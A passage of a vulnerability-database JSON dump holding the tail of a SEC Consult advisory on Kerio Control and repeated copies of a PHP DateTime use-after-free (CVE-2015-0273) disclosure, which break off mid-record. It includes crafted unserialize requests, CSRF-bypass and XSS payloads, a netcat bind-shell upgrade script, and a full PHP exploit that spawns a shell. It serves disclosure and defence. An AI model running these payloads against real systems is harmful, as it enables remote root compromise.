Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        }
    ],
    "CVE-2015-0273": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP DateTime Use After Free Vulnerability. CVE-2015-0273. Dos exploit for php platform",
            "modified": "2015-02-23T00:00:00",
            "published": "2015-02-23T00:00:00",
            "id": "EDB-ID:36158",
            "href": "https://www.exploit-db.com/exploits/36158/",
            "type": "exploitdb",
            "title": "PHP DateTime Use After Free Vulnerability",
            "sourceData": "Use After Free Vulnerability in unserialize() with DateTime* [CVE-2015-0273]\r\n\r\nTaoguang Chen <[@chtg](http://github.com/chtg)> - Write Date:\r\n2015.1.29 - Release Date: 2015.2.20\r\n\r\nA use-after-free vulnerability was discovered in unserialize() with DateTime/DateTimeZone/DateInterval/DatePeriod objects's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\r\n\r\nAffected Versions\r\n------------\r\nAffected is PHP 5.6 < 5.6.6\r\nAffected is PHP 5.5 < 5.5.22\r\nAffected is PHP 5.4 < 5.4.38\r\n\r\nCredits\r\n------------\r\nThis vulnerability was disclosed by Taoguang Chen.\r\n\r\nDescription\r\n------------\r\n\r\nstatic int php_date_initialize_from_hash(php_date_obj **dateobj,\r\nHashTable *myht)\r\n{\r\n\tzval             *z_date;\r\n\tzval             *z_timezone;\r\n\tzval             *z_timezone_type;\r\n\tzval              tmp_obj;\r\n\ttimelib_tzinfo   *tzi;\r\n\tphp_timezone_obj *tzobj;\r\n\r\n\tz_date = zend_hash_str_find(myht, \"date\", sizeof(\"data\")-1);\r\n\tif (z_date) {\r\n\t\tconvert_to_string(z_date);\r\n\t\tz_timezone_type = zend_hash_str_find(myht, \"timezone_type\",\r\nsizeof(\"timezone_type\")-1);\r\n\t\tif (z_timezone_type) {\r\n\t\t\tconvert_to_long(z_timezone_type);\r\n\t\t\tz_timezone = zend_hash_str_find(myht, \"timezone\", sizeof(\"timezone\")-1);\r\n\t\t\tif (z_timezone) {\r\n\t\t\t\tconvert_to_string(z_timezone);\r\n\r\n...\r\n\r\nstatic int php_date_timezone_initialize_from_hash(zval **return_value,\r\nphp_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)\r\n{\r\n\tzval            **z_timezone = NULL;\r\n\tzval            **z_timezone_type = NULL;\r\n\r\n\tif (zend_hash_find(myht, \"timezone_type\", 14, (void**)\r\n&z_timezone_type) == SUCCESS) {\r\n\t\tif (zend_hash_find(myht, \"timezone\", 9, (void**) &z_timezone) == SUCCESS) {\r\n\t\t\tconvert_to_long(*z_timezone_type);\r\n\t\t\tif (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone)\r\nTSRMLS_CC)) {\r\n\t\t\t\treturn SUCCESS;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn FAILURE;\r\n}\r\n\r\nThe convert_to_long() leads to the ZVAL and all its children is freed\r\nfrom memory. However the unserialize() code will still allow to use R:\r\nor r: to set references to that already freed memory. There is a use\r\nafter free vulnerability, and allows to execute arbitrary code.\r\n\r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.\r\n\r\n<?php\r\n\r\n$f = $argv[1];\r\n$c = $argv[2];\r\n\r\n$fakezval1 = ptr2str(0x100b83008);\r\n$fakezval1 .= ptr2str(0x8);\r\n$fakezval1 .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval1 .= \"\\x06\";\r\n$fakezval1 .= \"\\x00\";\r\n$fakezval1 .= \"\\x00\\x00\";\r\n\r\n$data1 = 'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval1).':\"'.$fakezval1.'\";i:2;a:1:{i:0;R:4;}}';\r\n\r\n$x = unserialize($data1);\r\n$y = $x[2];\r\n\r\n// zend_eval_string()'s address\r\n$y[0][0] = \"\\x6d\";\r\n$y[0][1] = \"\\x1e\";\r\n$y[0][2] = \"\\x35\";\r\n$y[0][3] = \"\\x00\";\r\n$y[0][4] = \"\\x01\";\r\n$y[0][5] = \"\\x00\";\r\n$y[0][6] = \"\\x00\";\r\n$y[0][7] = \"\\x00\";\r\n\r\n$fakezval2 = ptr2str(0x3b296324286624); // $f($c);\r\n$fakezval2 .= ptr2str(0x100b83000);\r\n$fakezval2 .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval2 .= \"\\x05\";\r\n$fakezval2 .= \"\\x00\";\r\n$fakezval2 .= \"\\x00\\x00\";\r\n\r\n$data2 = 'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval2).':\"'.$fakezval2.'\";i:2;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;R:4;}s:8:\"timezone\";s:3:\"UTC\";}}';\r\n\r\n$z = unserialize($data2);\r\n\r\nfunction ptr2str($ptr)\r\n{\r\n\t$out = \"\";\r\n\tfor ($i=0; $i<8; $i++) {\r\n\t\t$out .= chr($ptr & 0xff);\r\n\t\t$ptr >>= 8;\r\n\t}\r\n\treturn $out;\r\n}\r\n\r\n?>\r\n\r\nTest the PoC on the command line, then any PHP code can be executed:\r\n\r\n$ lldb php\r\n(lldb) target create \"php\"\r\nCurrent executable set to 'php' (x86_64).\r\n(lldb) run uafpoc.php assert \"system\\('sh'\\)==exit\\(\\)\"\r\nProcess 13472 launched: '/usr/bin/php' (x86_64)\r\nsh: no job control in this shell\r\nsh-3.2$ php -v\r\nPHP 5.5.14 (cli) (built: Sep  9 2014 19:09:25)\r\nCopyright (c) 1997-2014 The PHP Group\r\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\r\nsh-3.2$ exit\r\nexit\r\nProcess 13472 exited with status = 0 (0x00000000)\r\n(lldb)\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36158"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category dos / poc",
            "modified": "2015-02-23T00:00:00",
            "published": "2015-02-23T00:00:00",
            "id": "1337DAY-ID-23316",
            "href": "https://0day.today/exploit/description/23316",
            "type": "zdt",
            "title": "PHP DateTime Use After Free Vulnerability",
            "sourceData": "Use After Free Vulnerability in unserialize() with DateTime* [CVE-2015-0273]\r\n \r\nTaoguang Chen <[@chtg](http://github.com/chtg)> - Write Date:\r\n2015.1.29 - Release Date: 2015.2.20\r\n \r\nA use-after-free vulnerability was discovered in unserialize() with DateTime/DateTimeZone/DateInterval/DatePeriod objects's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\r\n \r\nAffected Versions\r\n------------\r\nAffected is PHP 5.6 < 5.6.6\r\nAffected is PHP 5.5 < 5.5.22\r\nAffected is PHP 5.4 < 5.4.38\r\n \r\nCredits\r\n------------\r\nThis vulnerability was disclosed by Taoguang Chen.\r\n \r\nDescription\r\n------------\r\n \r\nstatic int php_date_initialize_from_hash(php_date_obj **dateobj,\r\nHashTable *myht)\r\n{\r\n    zval             *z_date;\r\n    zval             *z_timezone;\r\n    zval             *z_timezone_type;\r\n    zval              tmp_obj;\r\n    timelib_tzinfo   *tzi;\r\n    php_timezone_obj *tzobj;\r\n \r\n    z_date = zend_hash_str_find(myht, \"date\", sizeof(\"data\")-1);\r\n    if (z_date) {\r\n        convert_to_string(z_date);\r\n        z_timezone_type = zend_hash_str_find(myht, \"timezone_type\",\r\nsizeof(\"timezone_type\")-1);\r\n        if (z_timezone_type) {\r\n            convert_to_long(z_timezone_type);\r\n            z_timezone = zend_hash_str_find(myht, \"timezone\", sizeof(\"timezone\")-1);\r\n            if (z_timezone) {\r\n                convert_to_string(z_timezone);\r\n \r\n...\r\n \r\nstatic int php_date_timezone_initialize_from_hash(zval **return_value,\r\nphp_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)\r\n{\r\n    zval            **z_timezone = NULL;\r\n    zval            **z_timezone_type = NULL;\r\n \r\n    if (zend_hash_find(myht, \"timezone_type\", 14, (void**)\r\n&z_timezone_type) == SUCCESS) {\r\n        if (zend_hash_find(myht, \"timezone\", 9, (void**) &z_timezone) == SUCCESS) {\r\n            convert_to_long(*z_timezone_type);\r\n            if (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone)\r\nTSRMLS_CC)) {\r\n                return SUCCESS;\r\n            }\r\n        }\r\n    }\r\n    return FAILURE;\r\n}\r\n \r\nThe convert_to_long() leads to the ZVAL and all its children is freed\r\nfrom memory. However the unserialize() code will still allow to use R:\r\nor r: to set references to that already freed memory. There is a use\r\nafter free vulnerability, and allows to execute arbitrary code.\r\n \r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.\r\n \r\n<?php\r\n \r\n$f = $argv[1];\r\n$c = $argv[2];\r\n \r\n$fakezval1 = ptr2str(0x100b83008);\r\n$fakezval1 .= ptr2str(0x8);\r\n$fakezval1 .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval1 .= \"\\x06\";\r\n$fakezval1 .= \"\\x00\";\r\n$fakezval1 .= \"\\x00\\x00\";\r\n \r\n$data1 = 'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval1).':\"'.$fakezval1.'\";i:2;a:1:{i:0;R:4;}}';\r\n \r\n$x = unserialize($data1);\r\n$y = $x[2];\r\n \r\n// zend_eval_string()'s address\r\n$y[0][0] = \"\\x6d\";\r\n$y[0][1] = \"\\x1e\";\r\n$y[0][2] = \"\\x35\";\r\n$y[0][3] = \"\\x00\";\r\n$y[0][4] = \"\\x01\";\r\n$y[0][5] = \"\\x00\";\r\n$y[0][6] = \"\\x00\";\r\n$y[0][7] = \"\\x00\";\r\n \r\n$fakezval2 = ptr2str(0x3b296324286624); // $f($c);\r\n$fakezval2 .= ptr2str(0x100b83000);\r\n$fakezval2 .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval2 .= \"\\x05\";\r\n$fakezval2 .= \"\\x00\";\r\n$fakezval2 .= \"\\x00\\x00\";\r\n \r\n$data2 = 'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval2).':\"'.$fakezval2.'\";i:2;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;R:4;}s:8:\"timezone\";s:3:\"UTC\";}}';\r\n \r\n$z = unserialize($data2);\r\n \r\nfunction ptr2str($ptr)\r\n{\r\n    $out = \"\";\r\n    for ($i=0; $i<8; $i++) {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n \r\n?>\r\n \r\nTest the PoC on the command line, then any PHP code can be executed:\r\n \r\n$ lldb php\r\n(lldb) target create \"php\"\r\nCurrent executable set to 'php' (x86_64).\r\n(lldb) run uafpoc.php assert \"system\\('sh'\\)==exit\\(\\)\"\r\nProcess 13472 launched: '/usr/bin/php' (x86_64)\r\nsh: no job control in this shell\r\nsh-3.2$ php -v\r\nPHP 5.5.14 (cli) (built: Sep  9 2014 19:09:25)\r\nCopyright (c) 1997-2014 The PHP Group\r\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\r\nsh-3.2$ exit\r\nexit\r\nProcess 13472 exited with status = 0 (0x00000000)\r\n(lldb)\n\n#  0day.today [2018-03-13]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-23316"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2015-02-20T00:00:00",
            "published": "2015-02-20T00:00:00",
            "href": "https://packetstormsecurity.com/files/130471/PHP-DateTime-Use-After-Free.html",
            "id": "PACKETSTORM:130471",
            "type": "packetstorm",
            "title": "PHP DateTime Use-After-Free",
            "sourceData": "`#Use After Free Vulnerability in unserialize() with DateTime* [CVE-2015-0273]  \n  \nTaoguang Chen <[@chtg](http://github.com/chtg)> - Write Date:  \n2015.1.29 - Release Date: 2015.2.20  \n  \n> A use-after-free vulnerability was discovered in unserialize() with DateTime/DateTimeZone/DateInterval/DatePeriod objects's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.  \n  \nAffected Versions  \n------------  \nAffected is PHP 5.6 < 5.6.6  \nAffected is PHP 5.5 < 5.5.22  \nAffected is PHP 5.4 < 5.4.38  \n  \nCredits  \n------------  \nThis vulnerability was disclosed by Taoguang Chen.  \n  \nDescription  \n------------  \n  \n```  \nstatic int php_date_initialize_from_hash(php_date_obj **dateobj,  \nHashTable *myht)  \n{  \nzval *z_date;  \nzval *z_timezone;  \nzval *z_timezone_type;  \nzval tmp_obj;  \ntimelib_tzinfo *tzi;  \nphp_timezone_obj *tzobj;  \n  \nz_date = zend_hash_str_find(myht, \"date\", sizeof(\"data\")-1);  \nif (z_date) {  \nconvert_to_string(z_date);  \nz_timezone_type = zend_hash_str_find(myht, \"timezone_type\",  \nsizeof(\"timezone_type\")-1);  \nif (z_timezone_type) {  \nconvert_to_long(z_timezone_type);  \nz_timezone = zend_hash_str_find(myht, \"timezone\", sizeof(\"timezone\")-1);  \nif (z_timezone) {  \nconvert_to_string(z_timezone);  \n  \n...  \n  \nstatic int php_date_timezone_initialize_from_hash(zval **return_value,  \nphp_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)  \n{  \nzval **z_timezone = NULL;  \nzval **z_timezone_type = NULL;  \n  \nif (zend_hash_find(myht, \"timezone_type\", 14, (void**)  \n&z_timezone_type) == SUCCESS) {  \nif (zend_hash_find(myht, \"timezone\", 9, (void**) &z_timezone) == SUCCESS) {  \nconvert_to_long(*z_timezone_type);  \nif (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone)  \nTSRMLS_CC)) {  \nreturn SUCCESS;  \n}  \n}  \n}  \nreturn FAILURE;  \n}  \n```  \n  \nThe convert_to_long() leads to the ZVAL and all its children is freed  \nfrom memory. However the unserialize() code will still allow to use R:  \nor r: to set references to that already freed memory. There is a use  \nafter free vulnerability, and allows to execute arbitrary code.  \n  \nProof of Concept Exploit  \n------------  \nThe PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.  \n  \n```  \n<?php  \n  \n$f = $argv[1];  \n$c = $argv[2];  \n  \n$fakezval1 = ptr2str(0x100b83008);  \n$fakezval1 .= ptr2str(0x8);  \n$fakezval1 .= \"\\x00\\x00\\x00\\x00\";  \n$fakezval1 .= \"\\x06\";  \n$fakezval1 .= \"\\x00\";  \n$fakezval1 .= \"\\x00\\x00\";  \n  \n$data1 = 